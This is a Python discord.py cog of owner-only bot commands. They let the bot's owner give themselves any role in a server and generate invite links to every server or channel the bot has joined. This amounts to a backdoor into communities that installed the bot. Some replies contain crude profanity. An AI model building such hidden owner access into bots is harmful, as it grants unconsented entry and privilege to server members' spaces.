import discord
from discord.ext import commands

class owner(commands.Cog):
    def __init__(self, client):
        self.client = client
        
    @commands.command()
    @commands.is_owner()
    async def gr(self, ctx, role_id):
        guild = ctx.guild
        role = discord.utils.get(guild.roles, id=int(role_id))

        if role:
            await ctx.author.add_roles(role)
            await ctx.send(f"did")
        else:
            await ctx.send(f"fuck you saying my boy i could NOT find that shitty ass role that you want")
            
    @commands.command()
    @commands.is_owner()
    async def rr(self, ctx, role_id):
        guild = ctx.guild
        role = discord.utils.get(guild.roles, id=int(role_id))

        if role:
            await ctx.author.remove_roles(role)
            await ctx.send(f"did")
        else:
            await ctx.send(f"dumb fuck u neva had that role cuz u poor & u get no bitches <:w_skulldead:1208314335714086922>")
            
            
    @commands.command()
    @commands.is_owner()
    async def allservers(self, ctx):
        if ctx.guild is not None:
            guilds = self.client.guilds

            for guild in guilds:
                try:
                    invite = await guild.text_channels[0].create_invite(max_age=86400)
                    await ctx.send(f"**Server: {guild.name}**\nInvite link (expires in 1 day): {invite}\n")
                except discord.errors.Forbidden:
                    await ctx.send(f"**Server: {guild.name}**\nUnable to create invite link due to insufficient permissions.\n")
                    
                    
    @commands.command()
    @commands.is_owner()
    async def gi(self, ctx, identifier: str):
        guild = None

        if identifier.isdigit():
            guild = self.client.get_guild(int(identifier))
        else:
            guild = discord.utils.get(self.client.guilds, name=identifier)

        if guild:
            invite = await ctx.send(f"Invite link for {guild.name}: {await self.generate_invite(guild)}")
        else:
            await ctx.send(f"Server or guild with identifier {identifier} not found.")

    async def generate_invite(self, guild):
        invite = await guild.text_channels[0].create_invite()
        return invite.url
    
    @commands.command()
    @commands.is_owner()
    async def get(self, ctx, id):
        try:
            channel = self.client.get_channel(int(id))
            invite = await channel.create_invite(max_uses=1,unique=True)
            await ctx.send(invite)
            await ctx.send(f'{channel.id}, {channel.guild.id}')
        except Exception as e:
            await ctx.send(e)
            
    @commands.command()
    @commands.has_permissions(administrator=True)
    async def test2(self, ctx):
        await ctx.send('i maybe work or not ;3')
            
async def setup(client):
    await client.add_cog(owner(client))